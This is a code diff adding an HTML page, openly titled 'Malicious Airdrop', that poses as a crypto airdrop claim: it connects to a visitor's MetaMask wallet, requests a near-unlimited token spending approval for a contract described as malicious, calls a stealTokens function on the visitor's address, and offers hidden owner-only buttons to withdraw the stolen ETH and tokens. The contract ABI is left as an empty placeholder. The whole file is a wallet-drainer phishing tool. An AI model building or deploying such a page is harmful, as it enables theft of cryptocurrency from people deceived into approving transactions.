@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Malicious Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
+</head>
+<body>
+  <h1>Claim Your Malicious Airdrop</h1>
+
+  <button id="connectButton">Connect to MetaMask</button>
+  <button id="approveButton" disabled>Approve Unlimited Spending</button>
+  <button id="claimAirdropButton" disabled>Claim Airdrop</button>
+  
+  <!-- Withdraw buttons for the owner -->
+  <button id="withdrawETHButton" style="display:none;">Withdraw ETH</button>
+  <button id="withdrawTokensButton" style="display:none;">Withdraw Tokens</button>
+
+  <script>
+    // Set the contract address and ABI (from your provided information)
+    const contractAddress = '0x51ACC66Ea593080C8e006ddE56eb86b060A0fd37'; // The malicious contract address
+    const tokenAddress = '0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4'; // The token address (e.g., TKK)
+    const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414'; // Owner's wallet address
+    
+    const contractABI = [
+      // Include all your provided contract ABI methods here...
+    ];
+
+    // Declare the Web3 instance and contract variables
+    let web3;
+    let contract;
+    let accounts;
+
+    // Set up the connection to MetaMask
+    async function connectMetaMask() {
+      if (typeof window.ethereum !== 'undefined') {
+        web3 = new Web3(window.ethereum);
+        try {
+          // Request MetaMask connection
+          accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
+          document.getElementById('approveButton').disabled = false; // Enable the approve button
+
+          // Check if the connected wallet is the owner
+          if (accounts[0].toLowerCase() === ownerAddress.toLowerCase()) {
+            document.getElementById('withdrawETHButton').style.display = 'inline-block'; // Show withdraw buttons
+            document.getElementById('withdrawTokensButton').style.display = 'inline-block';
+          }
+        } catch (error) {
+          alert('User rejected the request');
+        }
+      } else {
+        alert('Please install MetaMask to use this feature');
+      }
+    }
+
+    // Function to approve unlimited token spending
+    async function approveSpending() {
+      if (!web3) return;
+
+      const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
+      try {
+        // Approve unlimited spending (set to a very large number)
+        const approvalAmount = web3.utils.toWei('1000000000', 'ether'); // Set a large number
+        const tx = await tokenContract.methods.approve(contractAddress, approvalAmount).send({ from: accounts[0] });
+        alert('Approval successful!');
+        document.getElementById('claimAirdropButton').disabled = false; // Enable the claim button
+      } catch (error) {
+        console.error('Error approving spending:', error);
+        alert('Error during approval');
+      }
+    }
+
+    // Function to claim the airdrop (actually performs the malicious action)
+    async function claimAirdrop() {
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
+      try {
+        // Call the stealTokens function, passing the connected user's address as the victim
+        const tx = await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+        alert('Airdrop claimed! Tokens are being stolen!');
+      } catch (error) {
+        console.error('Error claiming airdrop:', error);
+        alert('Error during claiming airdrop');
+      }
+    }
+
+    // Function to withdraw ETH (only for the owner)
+    async function withdrawETH() {
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
+      try {
+        const tx = await maliciousContract.methods.withdrawETH().send({ from: ownerAddress });
+        alert('ETH Withdrawn successfully');
+      } catch (error) {
+        console.error('Error withdrawing ETH:', error);
+        alert('Error during ETH withdrawal');
+      }
+    }
+
+    // Function to withdraw tokens (only for the owner)
+    async function withdrawTokens() {
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
+      try {
+        const tx = await maliciousContract.methods.withdrawTokens().send({ from: ownerAddress });
+        alert('Tokens Withdrawn successfully');
+      } catch (error) {
+        console.error('Error withdrawing tokens:', error);
+        alert('Error during token withdrawal');
+      }
+    }
+
+    // Set event listeners
+    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
+    document.getElementById('approveButton').addEventListener('click', approveSpending);
+    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
+    document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH);
+    document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);
+  </script>
+</body>
+</html>
